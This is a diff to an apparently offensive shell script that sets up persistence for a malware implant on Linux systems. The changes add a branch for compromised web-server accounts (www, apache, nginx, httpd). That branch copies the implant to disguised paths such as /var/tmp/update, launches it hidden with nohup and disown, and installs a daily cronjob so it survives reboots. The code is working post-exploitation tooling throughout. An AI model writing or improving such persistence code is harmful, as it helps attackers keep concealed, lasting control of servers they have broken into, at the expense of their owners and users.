@@ -60,6 +60,7 @@ if [ -f "$out" ]; then
             else
                 echo "[!]-----| Failed to established persistence.."
             fi
+            echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
         fi
 
         if [ "$b" -eq 0 ] && [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
@@ -107,16 +108,50 @@ EOF
                     (crontab -l 2>/dev/null; echo "$persist") | crontab -
                     last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
                     if [ "$last_line" = "$persist" ]; then
-                        success "Cronjob successfully created!"
-                        success "Persistence established.."
+                        success "[+]-----| Cronjob successfully created!"
+                        success "[i]-----| Persistence established.."
+                    else
+                        echo "[!]-----| Failed to add cronjob.."
                     fi
                 else
                     echo "[!]-----| Failed to add cronjob.."
                 fi
+                echo "[i]-----| Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
                 nohup ~/.config/tasks/auto-update &>/dev/null & disown
             fi
         fi
-        
-        echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
+
+        if [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
+            echo "[i]-----| Setting up cronjob for persistence.."
+            if [ -d /var/tmp ] && [ -w /var/tmp ]; then
+                tasks="/var/tmp"
+            else
+                tasks="/tmp"
+            fi
+
+            binary="$tasks/update"
+
+            mkdir -p $tasks
+            mv "/tmp/<IMPLANT>" $binary
+
+            nohup $binary &>/dev/null & disown
+
+            persist="@daily $binary"
+
+            if command -v crontab >/dev/null 2>&1; then
+                (crontab -l 2>/dev/null; echo "$persist") | crontab -
+                last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
+                if [ "$last_line" = "$persist" ]; then
+                    success "[+]-----| Cronjob successfully created!"
+                    success "[i]-----| Persistence established.."
+                else
+                    echo "[!]-----| Failed to add cronjob.."
+                fi
+            else
+                echo "[!]-----| Failed to add cronjob.."
+            fi
+            echo "[i]-----| Run the binary: $ nohup $binary &>/dev/null & disown"
+            nohup $binary &>/dev/null & disown
+        fi
     fi
 fi
